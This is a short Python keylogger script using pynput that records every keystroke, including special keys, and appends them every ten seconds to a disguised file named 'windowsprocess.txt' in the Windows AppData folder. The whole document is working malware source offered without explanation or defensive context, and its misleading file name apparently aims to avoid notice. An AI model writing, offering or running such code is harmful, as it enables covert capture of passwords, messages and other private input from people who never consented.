#!/usr/bin/python3
import pynput.keyboard
import threading
import os

keys = " "
path = os.path.join(os.environ["appdata"], "windowsprocess.txt")  

def process_keys(key):
    global keys
    try:
        keys += str(key.char)  
    except AttributeError:
        # Handle special keys
        if key == key.space:
            keys += " "
        elif key == key.enter:
            keys += "\n"
        elif key == key.right:
            keys += "[Right Arrow]"
        elif key == key.left:
            keys += "[Left Arrow]"
        elif key == key.up:
            keys += "[Up Arrow]"
        elif key == key.down:
            keys += "[Down Arrow]"
        else:
            keys += f" {str(key)} "  

def report():
    global keys
    try:
        with open(path, "a") as fin:  
            fin.write(keys)
        keys = ""  
    except Exception as e:
        print(f"[Error] Unable to write to log file: {e}")
   
    timer = threading.Timer(10, report)
    timer.start()

def start():
    
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        report()  # Start periodic key reporting
        keyboard_listener.join()  
